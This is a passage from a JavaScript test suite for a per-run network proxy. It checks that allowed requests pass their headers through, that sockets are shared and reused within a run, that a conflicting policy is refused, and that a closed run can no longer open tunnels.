      const sock = await proxy.open('run-1', docs);
      expect((await viaTls(sock, 'docs.test', 'GET', '/', { authorization: 'Bearer docs', 'anthropic-beta': 'x' })).body).toBe('up GET docs.test / authorization=Bearer docs anthropic-beta=x');
    });
  });

  it('shares one socket between concurrent opens, and refuses another policy for an open run', async () => {
    const [a, b] = await Promise.all([proxy.open('run-1', docs), proxy.open('run-1', docs)]);
    expect(a).toBe(b);
    await expect(proxy.open('run-1', { level: 'full', allow: [] })).rejects.toThrow(/open at limited/);
    await expect(proxy.open('run-1', { level: 'limited', allow: [] })).rejects.toThrow(/docs.test/);
  });

  it('keeps one socket per run, the same on a replay, gone once closed', async () => {
    const a = await proxy.open('run-1', { level: 'limited', allow: [] });
    expect(await proxy.open('run-1', { level: 'limited', allow: [] })).toBe(a);
    expect(proxy.isOpen('run-1')).toBe(true);
    expect(await proxy.open('run-2', { level: 'limited', allow: [] })).not.toBe(a);
    await proxy.close('run-1');
    await proxy.close('run-1');
    expect(proxy.isOpen('run-1')).toBe(false);
    await expect(tunnel(a, 'nodejs.org:443')).rejects.toThrow();
  });
});
